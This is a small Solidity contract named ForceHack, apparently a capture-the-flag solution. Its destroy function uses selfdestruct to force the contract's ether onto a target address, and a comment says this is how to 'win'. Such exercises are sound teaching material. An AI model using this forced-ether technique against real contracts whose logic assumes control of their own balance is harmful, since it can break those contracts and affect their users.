// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {

  // Selfdestruct will send any ether on contract to the delegate, make that
  // our target address to win.
  function destroy(address _delegateAddress) public {
    selfdestruct(payable(address(_delegateAddress)));
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }

  // Function to receive Ether. msg.data must be empty
  receive() external payable {}

  // Fallback function is called if msg.data is not empty
  fallback() external payable {}
}